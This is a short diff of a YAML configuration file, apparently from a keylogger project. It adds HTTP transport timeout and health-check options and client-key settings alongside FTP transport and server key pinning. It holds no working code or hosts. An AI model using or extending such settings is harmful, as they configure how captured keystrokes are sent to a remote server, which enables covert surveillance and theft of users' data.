@@ -63,6 +63,10 @@ transport:
     url: ""
     method: "POST"
     headers: {}
+    timeout: 30
+    verify: true
+    healthcheck_url: ""
+    healthcheck_interval: 60
 
   ftp:
     host: ""
@@ -92,6 +96,8 @@ encryption:
     key_store_path: "~/.advancekeylogger/keys/"
     server_public_key: ""   # base64-encoded X25519 public key from server
     pin_server_key: true
+    emit_client_keys: false
+    client_keys_path: ""
 
 compression:
   enabled: true
